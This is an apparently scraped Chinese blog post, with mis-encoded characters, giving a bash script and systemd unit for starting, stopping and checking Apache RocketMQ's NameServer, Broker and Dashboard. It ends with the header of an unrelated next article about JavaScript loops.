<span class="hljs-function"><span class="hljs-title">start_namesrv</span></span>() {
    <span class="hljs-built_in">echo</span> -e <span class="hljs-string">"<span class="hljs-variable">${YELLOW}</span>å¯åŠ¨RocketMQ NameServer...<span class="hljs-variable">${NC}</span>"</span>
    
    <span class="hljs-keyword">if</span> check_process <span class="hljs-string">"mqnamesrv"</span>; <span class="hljs-keyword">then</span>
        <span class="hljs-built_in">echo</span> -e <span class="hljs-string">"<span class="hljs-variable">${GREEN}</span>NameServerå·²åœ¨è¿è¡Œä¸­<span class="hljs-variable">${NC}</span>"</span>
        <span class="hljs-built_in">return</span>
    <span class="hljs-keyword">fi</span>
    
    <span class="hljs-built_in">cd</span> <span class="hljs-string">"<span class="hljs-variable">$ROCKETMQ_BIN_DIR</span>"</span> || <span class="hljs-built_in">exit</span> 1
    <span class="hljs-built_in">nohup</span> ./mqnamesrv &gt; /tmp/namesrv.log 2&gt;&amp;1 &amp;
    
    <span class="hljs-comment"># ç­‰å¾…å‡ ç§’è®©è¿›ç¨‹å¯åŠ¨</span>
    <span class="hljs-built_in">sleep</span> 3
    
    <span class="hljs-keyword">if</span> check_process <span class="hljs-string">"mqnamesrv"</span>; <span class="hljs-keyword">then</span>
        <span class="hljs-built_in">echo</span> -e <span class="hljs-string">"<span class="hljs-variable">${GREEN}</span>NameServerå¯åŠ¨æˆåŠŸ!<span class="hljs-variable">${NC}</span>"</span>
        <span class="hljs-built_in">echo</span> -e <span class="hljs-string">"æ—¥å¿—æ–‡ä»¶: /tmp/namesrv.log"</span>
    <span class="hljs-keyword">else</span>
        <span class="hljs-built_in">echo</span> -e <span class="hljs-string">"<span class="hljs-variable">${RED}</span>NameServerå¯åŠ¨å¤±è´¥ï¼Œè¯·æ£€æŸ¥æ—¥å¿—<span class="hljs-variable">${NC}</span>"</span>
        <span class="hljs-built_in">echo</span> -e <span class="hljs-string">"æŸ¥çœ‹æ—¥å¿—: tail -f /tmp/namesrv.log"</span>
        <span class="hljs-built_in">exit</span> 1
    <span class="hljs-keyword">fi</span>
}

<span class="hljs-comment"># å¯åŠ¨Broker</span>
<span class="hljs-function"><span class="hljs-title">start_broker</span></span>() {
    <span class="hljs-built_in">echo</span> -e <span class="hljs-string">"<span class="hljs-variable">${YELLOW}</span>å¯åŠ¨RocketMQ Broker...<span class="hljs-variable">${NC}</span>"</span>
    
    <span class="hljs-keyword">if</span> check_process <span class="hljs-string">"mqbroker"</span>; <span class="hljs-keyword">then</span>
        <span class="hljs-built_in">echo</span> -e <span class="hljs-string">"<span class="hljs-variable">${GREEN}</span>Brokerå·²åœ¨è¿è¡Œä¸­<span class="hljs-variable">${NC}</span>"</span>
        <span class="hljs-built_in">return</span>
    <span class="hljs-keyword">fi</span>
    
    <span class="hljs-built_in">cd</span> <span class="hljs-string">"<span class="hljs-variable">$ROCKETMQ_BIN_DIR</span>"</span> || <span class="hljs-built_in">exit</span> 1
    <span class="hljs-built_in">nohup</span> ./mqbroker &gt; /tmp/broker.log 2&gt;&amp;1 &amp;
    
    <span class="hljs-comment"># ç­‰å¾…å‡ ç§’è®©è¿›ç¨‹å¯åŠ¨</span>
    <span class="hljs-built_in">sleep</span> 5
    
    <span class="hljs-keyword">if</span> check_process <span class="hljs-string">"mqbroker"</span>; <span class="hljs-keyword">then</span>
        <span class="hljs-built_in">echo</span> -e <span class="hljs-string">"<span class="hljs-variable">${GREEN}</span>Brokerå¯åŠ¨æˆåŠŸ!<span class="hljs-variable">${NC}</span>"</span>
        <span class="hljs-built_in">echo</span> -e <span class="hljs-string">"æ—¥å¿—æ–‡ä»¶: /tmp/broker.log"</span>
    <span class="hljs-keyword">else</span>
        <span class="hljs-built_in">echo</span> -e <span class="hljs-string">"<span class="hljs-variable">${RED}</span>Brokerå¯åŠ¨å¤±è´¥ï¼Œè¯·æ£€æŸ¥æ—¥å¿—<span class="hljs-variable">${NC}</span>"</span>
        <span class="hljs-built_in">echo</span> -e <span class="hljs-string">"æŸ¥çœ‹æ—¥å¿—: tail -f /tmp/broker.log"</span>
        <span class="hljs-built_in">exit</span> 1
    <span class="hljs-keyword">fi</span>
}

<span class="hljs-comment"># å¯åŠ¨Dashboard</span>
<span class="hljs-function"><span class="hljs-title">start_dashboard</span></span>() {
    <span class="hljs-built_in">echo</span> -e <span class="hljs-string">"<span class="hljs-variable">${YELLOW}</span>å¯åŠ¨RocketMQ Dashboard...<span class="hljs-variable">${NC}</span>"</span>
    
    <span class="hljs-keyword">if</span> check_process <span class="hljs-string">"rocketmq-dashboard"</span>; <span class="hljs-keyword">then</span>
        <span class="hljs-built_in">echo</span> -e <span class="hljs-string">"<span class="hljs-variable">${GREEN}</span>Dashboardå·²åœ¨è¿è¡Œä¸­<span class="hljs-variable">${NC}</span>"</span>
        <span class="hljs-built_in">return</span>
    <span class="hljs-keyword">fi</span>
    
    <span class="hljs-built_in">cd</span> <span class="hljs-string">"<span class="hljs-variable">$ROCKETMQ_HOME</span>"</span> || <span class="hljs-built_in">exit</span> 1
    <span class="hljs-built_in">nohup</span> java -jar <span class="hljs-string">"<span class="hljs-variable">$DASHBOARD_JAR</span>"</span> &gt; dashboard.log 2&gt;&amp;1 &amp;
    
    <span class="hljs-comment"># ç­‰å¾…å‡ ç§’è®©è¿›ç¨‹å¯åŠ¨</span>
    <span class="hljs-built_in">sleep</span> 5
    
    <span class="hljs-keyword">if</span> check_process <span class="hljs-string">"rocketmq-dashboard"</span>; <span class="hljs-keyword">then</span>
        <span class="hljs-built_in">echo</span> -e <span class="hljs-string">"<span class="hljs-variable">${GREEN}</span>Dashboardå¯åŠ¨æˆåŠŸ!<span class="hljs-variable">${NC}</span>"</span>
        <span class="hljs-built_in">echo</span> -e <span class="hljs-string">"æ—¥å¿—æ–‡ä»¶: <span class="hljs-variable">$ROCKETMQ_HOME</span>/dashboard.log"</span>
        <span class="hljs-built_in">echo</span> -e <span class="hljs-string">"<span class="hljs-variable">${GREEN}</span>Dashboardè®¿é—®åœ°å€: http://æœåŠ¡å™¨IP:8080<span class="hljs-variable">${NC}</span>"</span>
    <span class="hljs-keyword">else</span>
        <span class="hljs-built_in">echo</span> -e <span class="hljs-string">"<span class="hljs-variable">${RED}</span>Dashboardå¯åŠ¨å¤±è´¥ï¼Œè¯·æ£€æŸ¥æ—¥å¿—<span class="hljs-variable">${NC}</span>"</span>
        <span class="hljs-built_in">echo</span> -e <span class="hljs-string">"æŸ¥çœ‹æ—¥å¿—: tail -f <span class="hljs-variable">$ROCKETMQ_HOME</span>/dashboard.log"</span>
        <span class="hljs-built_in">exit</span> 1
    <span class="hljs-keyword">fi</span>
}

<span class="hljs-comment"># æ˜¾ç¤ºçŠ¶æ€</span>
<span class="hljs-function"><span class="hljs-title">show_status</span></span>() {
    <span class="hljs-built_in">echo</span> -e <span class="hljs-string">"\n<span class="hljs-variable">${YELLOW}</span>====== RocketMQç»„ä»¶çŠ¶æ€ ======<span class="hljs-variable">${NC}</span>"</span>
    
    <span class="hljs-built_in">echo</span> -e <span class="hljs-string">"\n<span class="hljs-variable">${YELLOW}</span>NameServerçŠ¶æ€:<span class="hljs-variable">${NC}</span>"</span>
    <span class="hljs-keyword">if</span> check_process <span class="hljs-string">"mqnamesrv"</span>; <span class="hljs-keyword">then</span>
        <span class="hljs-built_in">echo</span> -e <span class="hljs-string">"<span class="hljs-variable">${GREEN}</span>è¿è¡Œä¸­ âˆš<span class="hljs-variable">${NC}</span>"</span>
        ps aux | grep mqnamesrv | grep -v grep
    <span class="hljs-keyword">else</span>
        <span class="hljs-built_in">echo</span> -e <span class="hljs-string">"<span class="hljs-variable">${RED}</span>æœªè¿è¡Œ Ã—<span class="hljs-variable">${NC}</span>"</span>
    <span class="hljs-keyword">fi</span>
    
    <span class="hljs-built_in">echo</span> -e <span class="hljs-string">"\n<span class="hljs-variable">${YELLOW}</span>BrokerçŠ¶æ€:<span class="hljs-variable">${NC}</span>"</span>
    <span class="hljs-keyword">if</span> check_process <span class="hljs-string">"mqbroker"</span>; <span class="hljs-keyword">then</span>
        <span class="hljs-built_in">echo</span> -e <span class="hljs-string">"<span class="hljs-variable">${GREEN}</span>è¿è¡Œä¸­ âˆš<span class="hljs-variable">${NC}</span>"</span>
        ps aux | grep mqbroker | grep -v grep
    <span class="hljs-keyword">else</span>
        <span class="hljs-built_in">echo</span> -e <span class="hljs-string">"<span class="hljs-variable">${RED}</span>æœªè¿è¡Œ Ã—<span class="hljs-variable">${NC}</span>"</span>
    <span class="hljs-keyword">fi</span>
    
    <span class="hljs-built_in">echo</span> -e <span class="hljs-string">"\n<span class="hljs-variable">${YELLOW}</span>DashboardçŠ¶æ€:<span class="hljs-variable">${NC}</span>"</span>
    <span class="hljs-keyword">if</span> check_process <span class="hljs-string">"rocketmq-dashboard"</span>; <span class="hljs-keyword">then</span>
        <span class="hljs-built_in">echo</span> -e <span class="hljs-string">"<span class="hljs-variable">${GREEN}</span>è¿è¡Œä¸­ âˆš<span class="hljs-variable">${NC}</span>"</span>
        ps aux | grep rocketmq-dashboard | grep -v grep
        <span class="hljs-built_in">echo</span> -e <span class="hljs-string">"<span class="hljs-variable">${GREEN}</span>è®¿é—®åœ°å€: http://<span class="hljs-subst">$(curl -s ifconfig.me)</span>:8080<span class="hljs-variable">${NC}</span>"</span>
    <span class="hljs-keyword">else</span>
        <span class="hljs-built_in">echo</span> -e <span class="hljs-string">"<span class="hljs-variable">${RED}</span>æœªè¿è¡Œ Ã—<span class="hljs-variable">${NC}</span>"</span>
    <span class="hljs-keyword">fi</span>
}

<span class="hljs-comment"># åœæ­¢æ‰€æœ‰ç»„ä»¶</span>
<span class="hljs-function"><span class="hljs-title">stop_all</span></span>() {
    <span class="hljs-built_in">echo</span> -e <span class="hljs-string">"<span class="hljs-variable">${YELLOW}</span>åœæ­¢RocketMQæ‰€æœ‰ç»„ä»¶...<span class="hljs-variable">${NC}</span>"</span>
    
    <span class="hljs-comment"># åœæ­¢Dashboard</span>
    dashboard_pid=$(ps aux | grep rocketmq-dashboard | grep -v grep | awk <span class="hljs-string">'{print $2}'</span>)
    <span class="hljs-keyword">if</span> [ -n <span class="hljs-string">"<span class="hljs-variable">$dashboard_pid</span>"</span> ]; <span class="hljs-keyword">then</span>
        <span class="hljs-built_in">echo</span> <span class="hljs-string">"åœæ­¢Dashboard (PID: <span class="hljs-variable">$dashboard_pid</span>)"</span>
        <span class="hljs-built_in">kill</span> -9 <span class="hljs-string">"<span class="hljs-variable">$dashboard_pid</span>"</span> 2&gt;/dev/null
    <span class="hljs-keyword">fi</span>
    
    <span class="hljs-comment"># åœæ­¢Broker</span>
    broker_pid=$(ps aux | grep mqbroker | grep -v grep | awk <span class="hljs-string">'{print $2}'</span>)
    <span class="hljs-keyword">if</span> [ -n <span class="hljs-string">"<span class="hljs-variable">$broker_pid</span>"</span> ]; <span class="hljs-keyword">then</span>
        <span class="hljs-built_in">echo</span> <span class="hljs-string">"åœæ­¢Broker (PID: <span class="hljs-variable">$broker_pid</span>)"</span>
        <span class="hljs-built_in">kill</span> -9 <span class="hljs-string">"<span class="hljs-variable">$broker_pid</span>"</span> 2&gt;/dev/null
    <span class="hljs-keyword">fi</span>
    
    <span class="hljs-comment"># åœæ­¢NameServer</span>
    namesrv_pid=$(ps aux | grep mqnamesrv | grep -v grep | awk <span class="hljs-string">'{print $2}'</span>)
    <span class="hljs-keyword">if</span> [ -n <span class="hljs-string">"<span class="hljs-variable">$namesrv_pid</span>"</span> ]; <span class="hljs-keyword">then</span>
        <span class="hljs-built_in">echo</span> <span class="hljs-string">"åœæ­¢NameServer (PID: <span class="hljs-variable">$namesrv_pid</span>)"</span>
        <span class="hljs-built_in">kill</span> -9 <span class="hljs-string">"<span class="hljs-variable">$namesrv_pid</span>"</span> 2&gt;/dev/null
    <span class="hljs-keyword">fi</span>
    
    <span class="hljs-built_in">echo</span> -e <span class="hljs-string">"<span class="hljs-variable">${GREEN}</span>æ‰€æœ‰ç»„ä»¶å·²åœæ­¢<span class="hljs-variable">${NC}</span>"</span>
}

<span class="hljs-comment"># æŸ¥çœ‹æ—¥å¿—</span>
<span class="hljs-function"><span class="hljs-title">view_logs</span></span>() {
    <span class="hljs-built_in">echo</span> -e <span class="hljs-string">"<span class="hljs-variable">${YELLOW}</span>é€‰æ‹©è¦æŸ¥çœ‹çš„æ—¥å¿—:<span class="hljs-variable">${NC}</span>"</span>
    <span class="hljs-built_in">echo</span> <span class="hljs-string">"1) NameServeræ—¥å¿—"</span>
    <span class="hljs-built_in">echo</span> <span class="hljs-string">"2) Brokeræ—¥å¿—"</span>
    <span class="hljs-built_in">echo</span> <span class="hljs-string">"3) Dashboardæ—¥å¿—"</span>
    <span class="hljs-built_in">echo</span> <span class="hljs-string">"4) æ‰€æœ‰æ—¥å¿—"</span>
    <span class="hljs-built_in">echo</span> <span class="hljs-string">"0) è¿”å›"</span>
    
    <span class="hljs-built_in">read</span> -p <span class="hljs-string">"è¯·é€‰æ‹© [0-4]: "</span> choice
    
    <span class="hljs-keyword">case</span> <span class="hljs-variable">$choice</span> <span class="hljs-keyword">in</span>
        1)
            <span class="hljs-built_in">echo</span> -e <span class="hljs-string">"<span class="hljs-variable">${YELLOW}</span>æŸ¥çœ‹NameServeræ—¥å¿—:<span class="hljs-variable">${NC}</span>"</span>
            <span class="hljs-built_in">tail</span> -100f /tmp/namesrv.log
            ;;
        2)
            <span class="hljs-built_in">echo</span> -e <span class="hljs-string">"<span class="hljs-variable">${YELLOW}</span>æŸ¥çœ‹Brokeræ—¥å¿—:<span class="hljs-variable">${NC}</span>"</span>
            <span class="hljs-built_in">tail</span> -100f /tmp/broker.log
            ;;
        3)
            <span class="hljs-built_in">echo</span> -e <span class="hljs-string">"<span class="hljs-variable">${YELLOW}</span>æŸ¥çœ‹Dashboardæ—¥å¿—:<span class="hljs-variable">${NC}</span>"</span>
            <span class="hljs-built_in">tail</span> -100f <span class="hljs-string">"<span class="hljs-variable">$ROCKETMQ_HOME</span>/dashboard.log"</span>
            ;;
        4)
            <span class="hljs-built_in">echo</span> -e <span class="hljs-string">"<span class="hljs-variable">${YELLOW}</span>æŸ¥çœ‹æ‰€æœ‰æ—¥å¿—(æŒ‰Ctrl+Cé€€å‡º)<span class="hljs-variable">${NC}</span>"</span>
            <span class="hljs-built_in">echo</span> -e <span class="hljs-string">"<span class="hljs-variable">${YELLOW}</span>=== NameServeræ—¥å¿— ===<span class="hljs-variable">${NC}</span>"</span>
            <span class="hljs-built_in">tail</span> -20 /tmp/namesrv.log
            <span class="hljs-built_in">echo</span> -e <span class="hljs-string">"\n<span class="hljs-variable">${YELLOW}</span>=== Brokeræ—¥å¿— ===<span class="hljs-variable">${NC}</span>"</span>
            <span class="hljs-built_in">tail</span> -20 /tmp/broker.log
            <span class="hljs-built_in">echo</span> -e <span class="hljs-string">"\n<span class="hljs-variable">${YELLOW}</span>=== Dashboardæ—¥å¿— ===<span class="hljs-variable">${NC}</span>"</span>
            <span class="hljs-built_in">tail</span> -20 <span class="hljs-string">"<span class="hljs-variable">$ROCKETMQ_HOME</span>/dashboard.log"</span>
            ;;
        0)
            <span class="hljs-built_in">return</span>
            ;;
        *)
            <span class="hljs-built_in">echo</span> -e <span class="hljs-string">"<span class="hljs-variable">${RED}</span>æ— æ•ˆé€‰æ‹©<span class="hljs-variable">${NC}</span>"</span>
            ;;
    <span class="hljs-keyword">esac</span>
}

<span class="hljs-comment"># ä¸»èœå•</span>
<span class="hljs-function"><span class="hljs-title">main_menu</span></span>() {
    <span class="hljs-keyword">while</span> <span class="hljs-literal">true</span>; <span class="hljs-keyword">do</span>
        <span class="hljs-built_in">echo</span> -e <span class="hljs-string">"\n<span class="hljs-variable">${YELLOW}</span>====== RocketMQç®¡ç†è„šæœ¬ ======<span class="hljs-variable">${NC}</span>"</span>
        <span class="hljs-built_in">echo</span> <span class="hljs-string">"1) å¯åŠ¨æ‰€æœ‰RocketMQç»„ä»¶"</span>
        <span class="hljs-built_in">echo</span> <span class="hljs-string">"2) åœæ­¢æ‰€æœ‰RocketMQç»„ä»¶"</span>
        <span class="hljs-built_in">echo</span> <span class="hljs-string">"3) æŸ¥çœ‹ç»„ä»¶çŠ¶æ€"</span>
        <span class="hljs-built_in">echo</span> <span class="hljs-string">"4) æŸ¥çœ‹æ—¥å¿—"</span>
        <span class="hljs-built_in">echo</span> <span class="hljs-string">"5) å•ç‹¬å¯åŠ¨NameServer"</span>
        <span class="hljs-built_in">echo</span> <span class="hljs-string">"6) å•ç‹¬å¯åŠ¨Broker"</span>
        <span class="hljs-built_in">echo</span> <span class="hljs-string">"7) å•ç‹¬å¯åŠ¨Dashboard"</span>
        <span class="hljs-built_in">echo</span> <span class="hljs-string">"8) æ£€æŸ¥ç¯å¢ƒ"</span>
        <span class="hljs-built_in">echo</span> <span class="hljs-string">"0) é€€å‡º"</span>
        
        <span class="hljs-built_in">read</span> -p <span class="hljs-string">"è¯·é€‰æ‹© [0-8]: "</span> choice
        
        <span class="hljs-keyword">case</span> <span class="hljs-variable">$choice</span> <span class="hljs-keyword">in</span>
            1)
                check_directories
                check_java
                start_namesrv
                start_broker
                start_dashboard
                show_status
                ;;
            2)
                stop_all
                ;;
            3)
                show_status
                ;;
            4)
                view_logs
                ;;
            5)
                start_namesrv
                ;;
            6)
                start_broker
                ;;
            7)
                start_dashboard
                ;;
            8)
                check_directories
                check_java
                ;;
            0)
                <span class="hljs-built_in">echo</span> -e <span class="hljs-string">"<span class="hljs-variable">${GREEN}</span>é€€å‡ºè„šæœ¬<span class="hljs-variable">${NC}</span>"</span>
                <span class="hljs-built_in">exit</span> 0
                ;;
            *)
                <span class="hljs-built_in">echo</span> -e <span class="hljs-string">"<span class="hljs-variable">${RED}</span>æ— æ•ˆé€‰æ‹©ï¼Œè¯·é‡æ–°è¾“å…¥<span class="hljs-variable">${NC}</span>"</span>
                ;;
        <span class="hljs-keyword">esac</span>
    <span class="hljs-keyword">done</span>
}

<span class="hljs-comment"># å¿«é€Ÿå¯åŠ¨æ¨¡å¼</span>
<span class="hljs-function"><span class="hljs-title">quick_start</span></span>() {
    check_directories
    check_java
    start_namesrv
    start_broker
    start_dashboard
    show_status
}

<span class="hljs-comment"># è„šæœ¬ä½¿ç”¨æ–¹æ³•</span>
<span class="hljs-function"><span class="hljs-title">usage</span></span>() {
    <span class="hljs-built_in">echo</span> -e <span class="hljs-string">"<span class="hljs-variable">${YELLOW}</span>ä½¿ç”¨æ–¹æ³•:<span class="hljs-variable">${NC}</span>"</span>
    <span class="hljs-built_in">echo</span> <span class="hljs-string">"  <span class="hljs-variable">$0</span> [é€‰é¡¹]"</span>
    <span class="hljs-built_in">echo</span> -e <span class="hljs-string">"\né€‰é¡¹:"</span>
    <span class="hljs-built_in">echo</span> <span class="hljs-string">"  start     å¿«é€Ÿå¯åŠ¨æ‰€æœ‰ç»„ä»¶"</span>
    <span class="hljs-built_in">echo</span> <span class="hljs-string">"  stop      åœæ­¢æ‰€æœ‰ç»„ä»¶"</span>
    <span class="hljs-built_in">echo</span> <span class="hljs-string">"  status    æŸ¥çœ‹çŠ¶æ€"</span>
    <span class="hljs-built_in">echo</span> <span class="hljs-string">"  menu      æ˜¾ç¤ºç®¡ç†èœå•(é»˜è®¤)"</span>
    <span class="hljs-built_in">echo</span> <span class="hljs-string">"  help      æ˜¾ç¤ºå¸®åŠ©ä¿¡æ¯"</span>
}

<span class="hljs-comment"># ä¸»ç¨‹åºå…¥å£</span>
<span class="hljs-keyword">if</span> [ <span class="hljs-variable">$#</span> -eq 0 ]; <span class="hljs-keyword">then</span>
    <span class="hljs-comment"># å¦‚æœæ²¡æœ‰å‚æ•°ï¼Œæ˜¾ç¤ºèœå•</span>
    main_menu
<span class="hljs-keyword">else</span>
    <span class="hljs-keyword">case</span> <span class="hljs-variable">$1</span> <span class="hljs-keyword">in</span>
        start)
            quick_start
            ;;
        stop)
            stop_all
            ;;
        status)
            show_status
            ;;
        menu)
            main_menu
            ;;
        <span class="hljs-built_in">help</span>)
            usage
            ;;
        *)
            <span class="hljs-built_in">echo</span> -e <span class="hljs-string">"<span class="hljs-variable">${RED}</span>æœªçŸ¥å‚æ•°: $1<span class="hljs-variable">${NC}</span>"</span>
            usage
            <span class="hljs-built_in">exit</span> 1
            ;;
    <span class="hljs-keyword">esac</span>
<span class="hljs-keyword">fi</span>
</code></pre>
<h3 data-id="heading-3">ä½¿ç”¨è¯´æ˜ï¼š</h3>
<h4 data-id="heading-4">1. åˆ›å»ºè„šæœ¬æ–‡ä»¶ï¼š</h4>
<p>åˆ›å»ºä¹‹å‰éœ€è¦å…ˆç¡®å®šå¥½åœ°å€</p>
<pre><code class="hljs language-bash" lang="bash">ROCKETMQ_BIN_DIR=<span class="hljs-string">"/usr/rocketmq/rocketmq-all-5.3.0-bin-release/bin"</span>
ROCKETMQ_HOME=<span class="hljs-string">"/usr/rocketmq"</span>
DASHBOARD_JAR=<span class="hljs-string">"rocketmq-dashboard-2.0.0.jar"</span>
</code></pre>
<p>ç„¶ååˆ›å»ºå¯åŠ¨è„šæœ¬</p>
<pre><code class="hljs language-bash" lang="bash">sudo vi /usr/rocketmq/start-rocketmq.sh
</code></pre>
<p>å°†ä¸Šé¢çš„è„šæœ¬å†…å®¹å¤åˆ¶åˆ°æ–‡ä»¶ä¸­ï¼Œä¿å­˜å¹¶é€€å‡ºã€‚</p>
<h4 data-id="heading-5">2. ç»™è„šæœ¬æ‰§è¡Œæƒé™ï¼š</h4>
<pre><code class="hljs language-bash" lang="bash">sudo <span class="hljs-built_in">chmod</span> +x /usr/rocketmq/start-rocketmq.sh
</code></pre>
<h4 data-id="heading-6">3. ä½¿ç”¨æ–¹æ³•ï¼š</h4>
<h5 data-id="heading-7">æ–¹æ³•ä¸€ï¼šä½¿ç”¨èœå•äº¤äº’æ¨¡å¼ï¼ˆæ¨èï¼‰</h5>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-built_in">cd</span> /usr/rocketmq
./start-rocketmq.sh
<span class="hljs-comment"># æˆ–è€…</span>
./start-rocketmq.sh menu
</code></pre>
<p>è¿™ä¼šæ˜¾ç¤ºä¸€ä¸ªäº¤äº’å¼èœå•ï¼Œå¯ä»¥é€‰æ‹©å¯åŠ¨ã€åœæ­¢ã€æŸ¥çœ‹çŠ¶æ€ç­‰åŠŸèƒ½ã€‚</p>
<h5 data-id="heading-8">æ–¹æ³•äºŒï¼šå¿«é€Ÿå¯åŠ¨æ‰€æœ‰ç»„ä»¶</h5>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-built_in">cd</span> /usr/rocketmq
./start-rocketmq.sh start
</code></pre>
<h5 data-id="heading-9">æ–¹æ³•ä¸‰ï¼šåªæŸ¥çœ‹çŠ¶æ€</h5>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-built_in">cd</span> /usr/rocketmq
./start-rocketmq.sh status
</code></pre>
<h5 data-id="heading-10">æ–¹æ³•å››ï¼šåœæ­¢æ‰€æœ‰ç»„ä»¶</h5>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-built_in">cd</span> /usr/rocketmq
./start-rocketmq.sh stop
</code></pre>
<h4 data-id="heading-11">4. åˆ›å»ºç³»ç»ŸæœåŠ¡ï¼ˆå¯é€‰ï¼‰</h4>
<p>å¦‚æœéœ€è¦å¼€æœºè‡ªå¯åŠ¨ï¼Œå¯ä»¥åˆ›å»ºsystemdæœåŠ¡ï¼š</p>
<pre><code class="hljs language-bash" lang="bash">sudo vi /etc/systemd/system/rocketmq.service
</code></pre>
<p>æ·»åŠ ä»¥ä¸‹å†…å®¹ï¼š</p>
<pre><code class="hljs language-properties" lang="properties">[Unit]
Description=RocketMQ Service
After=network.target

[Service]
Type=forking
ExecStart=/usr/rocketmq/start-rocketmq.sh start
ExecStop=/usr/rocketmq/start-rocketmq.sh stop
User=root
Restart=on-failure

[Install]
WantedBy=multi-user.target
</code></pre>
<p>å¯ç”¨å¹¶å¯åŠ¨æœåŠ¡ï¼š</p>
<pre><code class="hljs language-bash" lang="bash">sudo systemctl daemon-reload
sudo systemctl <span class="hljs-built_in">enable</span> rocketmq
sudo systemctl start rocketmq
</code></pre>
<h3 data-id="heading-12">æ€»ç»“</h3>
<p>ä»¥ä¸Šè„šæœ¬åªè¦é…ç½®å¥½åœ°å€ï¼Œå°±å¯ä»¥ç›´æ¥å¯åŠ¨ï¼Œæ¯”è¾ƒæ–¹ä¾¿ã€‚</p>
<hr/>
<p><em>è½¬å‘è¯·æºå¸¦ä½œè€…ä¿¡æ¯</em>Â  <strong>@æ€’æ”¾å§å¾·å¾· @ä¸€ä¸ªæœ‰æ¢¦æœ‰æˆçš„äºº</strong><br/>
æŒç»­åˆ›ä½œå¾ˆä¸å®¹æ˜“ï¼Œä½œè€…å°†ä»¥å°½å¯èƒ½çš„è¯¦ç»†æŠŠæ‰€å­¦çŸ¥è¯†åˆ†äº«å„ä½å¼€å‘è€…ï¼Œä¸€èµ·è¿›æ­¥ä¸€èµ·å­¦ä¹ ã€‚<strong>è½¬è½½è¯·æºå¸¦é“¾æ¥ï¼Œè½¬è½½åˆ°å¾®ä¿¡å…¬ä¼—å·è¯·å‹¿é€‰æ‹©åŸåˆ›ï¼Œè°¢è°¢ï¼</strong><br/>
ğŸ‘åˆ›ä½œä¸æ˜“ï¼Œå¦‚æœ‰é”™è¯¯è¯·æŒ‡æ­£ï¼Œæ„Ÿè°¢è§‚çœ‹ï¼è®°å¾—ç‚¹èµå“¦ï¼ğŸ‘<br/>
è°¢è°¢æ”¯æŒï¼</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[è¿˜åœ¨ç”¨forEachå¾ªç¯ï¼ŸJavaScriptä¸­è¿™5ç§éå†æ–¹æ³•æ•ˆç‡æå‡300%ï¼]]></title>    <link>https://juejin.cn/post/7597709339982495784</link>    <guid>https://juejin.cn/post/7597709339982495784</guid>    <pubDate>2026-01-22T04:17:18.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7597709339982495784" data-draft-id="7597664587460329507" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="è¿˜åœ¨ç”¨forEachå¾ªç¯ï¼ŸJavaScriptä¸­è¿™5ç§éå†æ–¹æ³•æ•ˆç‡æå‡300%ï¼"/> <meta itemprop="keywords" content="åç«¯,å‰ç«¯,äººå·¥æ™ºèƒ½"/> <meta itemprop="datePublished" content="2026-01-22T04:17:18.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="é˜¿æ©™çš„ç™¾å®ç®±"/> <meta itemprop="url" content="https://juejin.cn/user/1638743356481367"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            è¿˜åœ¨ç”¨forEachå¾ªç¯ï¼ŸJavaScriptä¸­è¿™5ç§éå†æ–¹æ³•æ•ˆç‡æå‡300%ï¼
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1638743356481367/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    é˜¿æ©™çš„ç™¾å®ç®±
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-22T04:17:18.000Z" title="Thu Jan 22 2026 04:17:18 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-22
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»1åˆ†é’Ÿ
